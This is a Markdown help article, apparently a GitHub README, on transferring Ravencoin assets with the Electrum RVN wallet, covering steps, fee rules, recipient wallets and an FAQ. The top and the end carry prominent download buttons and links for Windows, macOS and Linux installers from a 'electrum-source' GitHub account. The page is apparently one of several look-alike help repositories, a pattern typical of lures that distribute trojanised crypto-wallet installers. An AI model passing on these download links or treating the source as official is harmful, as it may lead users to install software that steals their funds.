![Electrum RVN](assets/banner-article.png)

# Transferring Ravencoin Assets with Electrum RVN

<!-- compact-download-block -->

<p align="center">Moving an asset with RVN for the fee</p>

<p align="center"><a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe"><img src="assets/button-windows.png" alt="Download for Windows"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg"><img src="https://img.shields.io/badge/DOWNLOAD-MACOS-F05239?style=for-the-badge&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="Download for macOS"></a> <a href="https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage"><img src="https://img.shields.io/badge/DOWNLOAD-LINUX-F05239?style=for-the-badge&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Download for Linux"></a></p>

<div align="center">

| Platform | Requirements | File |
| --- | --- | --- |
| <img src="assets/platform-windows.png" alt="Windows"> | Windows 10 (1909) or later, 64-bit | [`electrum-rvn-v4.8.0-setup.exe`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0-setup.exe) |
| <img src="https://img.shields.io/badge/macOS-F05239?style=flat-square&labelColor=131A38&logo=apple&logoColor=F5F7FB" alt="macOS"> | macOS 12 or later | [`electrum-rvn-v4.8.0.dmg`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.dmg) |
| <img src="https://img.shields.io/badge/Linux-F05239?style=flat-square&labelColor=131A38&logo=linux&logoColor=F5F7FB" alt="Linux"> | x64, Ubuntu 20.04 or later, or equivalent | [`electrum-rvn-v4.8.0.AppImage`](https://github.com/electrum-source/Electrum-RVN/releases/download/v4.8.0/electrum-rvn-v4.8.0.AppImage) |

</div>

All versions and checksums are on the [release page](https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0).

> [!WARNING]
> Only download from this GitHub release page.

<!-- /compact-download-block -->
An asset transfer is a normal transaction with an asset payload: you send a quantity of a named asset to an `R` address, and the fee is paid in RVN. Two things break it - a recipient wallet that does not understand assets, and a sender wallet with no RVN left to pay the fee.

## The transfer, step by step

1. **Open the assets section** and select the asset you are sending.
2. **Choose send** for that asset, not for RVN.
3. **Enter the recipient's `R` address** - the same address format as any Ravencoin payment.
4. **Enter the quantity.** For a unique asset there is only one to send; for a named asset, any amount up to your balance.
5. **Check the fee**, which is paid in RVN from the same wallet.
6. **Confirm and broadcast**, then wait for confirmations.
7. **Ask the recipient to confirm what they see**, because the failure mode here is silent.

Step seven is not politeness. An asset sent to a wallet that ignores assets confirms normally and shows nothing on the other side, and the recipient's first conclusion will be that you sent nothing at all.

## What the recipient needs

| Their wallet | Result |
| --- | --- |
| Understands native Ravencoin assets | balance appears after confirmations |
| Shows RVN only | transaction confirms, asset invisible |
| An exchange deposit address for RVN | usually not credited as an asset, and often unrecoverable |

Before you send anything meaningful, send a small amount of the asset and have them confirm it appears. That one test prevents the entire class of "I sent it and they say they got nothing".

If they insist an exchange address is fine, ask the exchange first whether it credits Ravencoin assets to that address. Most deposit flows are built for RVN, and an asset arriving at one is a support ticket at best.

## The fee rule that catches people

An asset transfer needs RVN in the sending wallet for the fee. A wallet holding an asset and zero RVN is a wallet that cannot move it.

Keep a float. If you are issuing or receiving assets, leave a small RVN balance in that wallet and do not sweep it to zero when tidying up. It is the single most common "I cannot send my asset" cause, and it has nothing to do with the asset itself.

## Sending a whole balance

If you are moving everything out of a wallet, send the asset and then the remaining RVN, not the other way round. Send the RVN first and you may leave yourself without the fee for the asset transfer - which means funding the wallet again from somewhere else before you can finish.

## Confirmations and display

Assets confirm like any transaction. The recipient's wallet may need a rescan or a server switch before it displays the new balance - [issued asset missing from Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md) covers a missing asset after issuance, and the same display rules apply after a transfer.

If the transaction is visible on an explorer but not in the wallet, the chain is fine and the wallet's view is stale. That is a rescan, not a loss.

## What cannot be undone

A confirmed transfer is final. There is no clawback and no issuer override - not even for a restricted asset, which controls who may hold it rather than reversing a completed send.

So the checks that matter happen before you press send: the address, the quantity, the asset name, and the recipient's wallet type. [Wrong address sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md) is honest about what happens when those checks are skipped.

## Moving assets between your own wallets

Common and straightforward: send from the hot wallet to the cold one, or the reverse. The same rules apply, with one addition - if the destination is a watch-only wallet, it can see the asset and cannot move it, which is exactly what cold storage wants - [watch-only wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md).

For a full cold-storage migration, move assets first, confirm, then the RVN - [electrum-rvn-cold-storage-workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md).

## Special cases

**Unique assets** transfer as a single unit, and the recipient must understand what they are receiving - [unique Ravencoin assets](https://github.com/electrum-source/token-and-network/blob/main/unique-ravencoin-assets-in-electrum-rvn.md).

**Restricted assets** carry the issuer's allow-list, so a transfer has to satisfy it before it completes - [what is a Ravencoin asset?](https://github.com/electrum-source/token-and-network/blob/main/what-is-a-ravencoin-asset-in-electrum-rvn.md) explains the restriction model.

**Sub-assets** are sent individually; each child is its own asset - [creating Ravencoin sub-assets](https://github.com/electrum-source/token-and-network/blob/main/creating-ravencoin-sub-assets-in-electrum-rvn.md).

**Burned assets** cannot be transferred, because they no longer exist - [burning and reissuing assets](https://github.com/electrum-source/token-and-network/blob/main/burning-and-reissuing-assets-with-electrum-rvn.md).

The wallet is actively maintained, and the current release is on the releases page: https://github.com/electrum-source/Electrum-RVN/releases/tag/v4.8.0. Asset handling improves between builds, so if a transfer behaves oddly on an older version, update before debugging. What creation costs is a separate question, answered by the chain-level charge the wallet quotes before you confirm.

## FAQ

### Why can't I send my asset?

Usually no RVN for the fee. A wallet with an asset and a zero RVN balance cannot broadcast the transfer.

### The recipient says nothing arrived - what happened?

Their wallet probably does not understand Ravencoin assets. Check the transaction on an explorer; if it confirmed, the asset is at their address and their software is the problem.

### Can I send an asset to an exchange?

Only if the exchange supports Ravencoin assets at that deposit address. Most RVN deposit flows do not, and an asset sent there may be unrecoverable.

### Does the recipient need RVN to receive?

No. Receiving is free for them; they need RVN only to send it onwards.

### Can a transfer be reversed?

No. A confirmed asset transfer is final, which is why the address and the recipient's wallet type are checked before sending.

<!-- related-articles -->

## Related articles

- [Issued Asset Missing From Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/issued-asset-missing-from-electrum-rvn.md)
- [Wrong Address Sends in Electrum RVN](https://github.com/electrum-source/token-and-network/blob/main/wrong-address-sends-in-electrum-rvn.md)
- [Watch-Only Wallets in Electrum RVN](https://github.com/electrum-source/passphrase-backup/blob/main/watch-only-wallets-in-electrum-rvn.md)
- [Electrum RVN Cold Storage Workflow](https://github.com/electrum-source/passphrase-backup/blob/main/electrum-rvn-cold-storage-workflow.md)
